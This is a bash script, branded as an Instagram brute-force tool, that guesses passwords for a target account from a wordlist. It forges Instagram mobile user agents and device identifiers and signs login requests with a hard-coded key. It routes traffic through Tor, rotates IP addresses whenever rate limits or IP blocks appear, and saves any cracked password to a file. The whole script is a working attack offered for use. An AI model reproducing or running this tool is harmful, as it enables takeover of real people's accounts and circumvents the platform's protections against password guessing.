#!/bin/bash

trap 'store;exit 1' 2

string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32 | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"

user_agents=(
  "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
  "Instagram 12.0.0.7.91 Android (23/6.0.1; 640dpi; 1440x2560; Samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)"
  "Instagram 13.0.0.1.91 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)"
  "Instagram 14.0.0.9.90 Android (25/7.1.1; 440dpi; 1080x1920; OnePlus; ONEPLUS A5000; OnePlus5; qcom; en_US)"
  "Instagram 15.0.0.11.90 Android (26/8.0.0; 480dpi; 1080x1920; Xiaomi; MI 6; sagit; qcom; en_US)"
)

get_random_ua() {
  local idx=$((RANDOM % ${#user_agents[@]}))
  echo "${user_agents[$idx]}"
}

current_ua=$(get_random_ua)
header='Connection: close
Accept: */*
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Cookie2: $Version=1
Accept-Language: en-US'

var=$(curl -s -A "$current_ua" -H "$header" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
var2=$(echo "$var" | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)

checkroot() {
  [[ "$(id -u)" -ne 0 ]] && { printf "\\e[1;77mRun as root\\n\\e[0m"; exit 1; }
}

dependencies() {
  for cmd in tor curl openssl awk sed cat tr wc cut uniq; do
    command -v $cmd >/dev/null 2>&1 || { echo "$cmd is required but not installed."; exit 1; }
  done
  [[ ! -e /dev/urandom ]] && { echo "/dev/urandom not found!"; exit 1; }
}

banner() {
clear
cat <<'EOF'
     _                              
 _  | |                _            
( \ | | ____    ___  _| |_  _____   
 ) )| ||  _ \  /___)(_   _)(____ |  
(_/ | || | | ||___ |  | |_ / ___ |  
    |_||_| |_|(___/    \__)\_____|  

  Instagram Brute Force Tool by @trhacknon(IG)
EOF
}

check_instagram_profile() {
    local username=$1
    profile_data=$(curl -s "https://www.instagram.com/$username/" -H "User-Agent: Mozilla/5.0")
    echo "$profile_data" | grep -q "Page Not Found" && return 1
    echo -e "\\e[1;92m[*] Username: $username\\e[0m"
    echo "$profile_data" | grep -q "is_private.:true" && echo -e "\\e[1;92m[*] Status: Privé\\e[0m" || echo -e "\\e[1;92m[*] Status: Public\\e[0m"
    return 0
}

start() {
  banner
  dependencies
  read -p $'\\e[1;92mUsername account: \\e[0m' user
  printf "\\e[1;77m[*] Vérification du profil Instagram...\\e[0m\\n"
  ! check_instagram_profile "$user" && { echo -e "\\e[1;91m[!] Profil invalide! Réessayez\\e[0m"; sleep 1; start; }
  default_wl_pass="passwords.lst"
  wl_pass=$(find . -name "*.lst" 2>/dev/null | fzf --prompt="Sélectionne une wordlist: " || echo "$default_wl_pass")
  default_threads="10"
  read -p $'\\e[1;92mThreads (Use < 20, Default 10): \\e[0m' threads
  threads="${threads:-${default_threads}}"
}

checktor() {
  check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org | grep -q "Congratulations" && echo 0 || echo 1)
  [[ "$check" -ne 0 ]] && { echo -e "\\e[1;91mPlease, check your TOR Connection!\\n\\e[0m"; exit 1; }
}

store() {
  [[ -n "$threads" ]] && {
    echo -e "\\e[1;91m [*] Waiting threads shutting down...\\e[0m"
    [[ "$threads" -gt 10 ]] && sleep 6 || sleep 3
    read -p $'\\e[1;77mSave session for user '"$user"$'? [Y/n]: \\e[0m' session
    [[ "$session" =~ ^[Yy]$ ]] || exit 1
    mkdir -p sessions
    countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
    printf "user=\\"%s\\"\\npass=\\"%s\\"\\nwl_pass=\\"%s\\"\\ntoken=\\"%s\\"\\n" $user $pass $wl_pass $countpass > "sessions/store.session.$user.$(date +%FT%H%M)"
    echo -e "\\e[1;92mSession saved. Use ./instashell --resume\\e[0m"
  }
  exit 1
}

changeip() {
  killall -HUP tor
  sleep 3
  checktor
}

login_request() {
  local pass=$1
  local data hmac http_code response response_body
  data="{\\\"phone_id\\\":\\\"$phone\\\", \\\"_csrftoken\\\":\\\"$var2\\\", \\\"username\\\":\\\"$user\\\", \\\"guid\\\":\\\"$guid\\\", \\\"device_id\\\":\\\"$device\\\", \\\"password\\\":\\\"$pass\\\", \\\"login_attempt_count\\\":\\\"0\\\"}"
  hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178" | cut -d " " -f2)
  current_ua=$(get_random_ua)
  response=$(curl --socks5-hostname 127.0.0.1:9050 -s \
    -A "$current_ua" \
    -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
    -H "$header" -w "\\n%{http_code}\\n" \
    "https://i.instagram.com/api/v1/accounts/login/")
  http_code=$(echo "$response" | tail -n1)
  response_body=$(echo "$response" | head -n -1)
  echo -e "$http_code\\n$response_body"
}

bruteforcer() {
  checktor
  count_pass=$(wc -l < "$wl_pass")
  echo -e "\\e[1;91m[*] Press Ctrl + C to stop or save session\\n\\e[0m"
  startline=1
  endline="$threads"
  token=0

  while [[ "$token" -lt "$count_pass" ]]; do
    sed -n "${startline},${endline}p" "$wl_pass" | while read -r pass; do
      { read -r http_code && read -r body; } < <(login_request "$pass")
      let token++
      if [[ "$http_code" == "200" ]] && echo "$body" | grep -q "logged_in_user"; then
        echo -e "\\e[1;92m\\n[✓] Mot de passe trouvé: $pass\\e[0m"
        echo "Username: $user, Password: $pass" >> found.instashell
        exit
      elif [[ "$http_code" == "429" ]] || echo "$body" | grep -q "ip_block"; then
        echo -e "\\e[1;91m[!] IP bloquée ou rate limit - Changement d'IP\\e[0m"
        changeip
      elif [[ "$http_code" == "400" ]] && echo "$body" | grep -q "bad_password"; then
        echo -e "\\e[1;91m[-] Mauvais mot de passe: $pass\\e[0m"
      fi
    done
    let startline+=threads
    let endline+=threads
    changeip
  done
}

resume() {
  banner
  checktor
  [[ ! -d sessions ]] && { echo -e "\\e[1;91m[*] No sessions\\n\\e[0m"; exit 1; }
  command -v fzf >/dev/null && selected_file=$(find sessions -name "store.session*" | fzf --prompt="Choisis une session à reprendre: ") || {
    counter=1
    for list in sessions/store.session*; do
      source "$list"
      echo "$counter) $list : $wl_pass, lastpass=$pass"
      let counter++
    done
    read -p "Choix: " fileresume
    selected_file=$(ls sessions/store.session* | sed -n "${fileresume}p")
  }
  source "$selected_file"
  read -p $'\\e[1;92mThreads (Default 10): \\e[0m' threads
  threads="${threads:-10}"
  bruteforcer
}

case "$1" in
  --resume) resume ;;
  *) start; bruteforcer ;;
esac
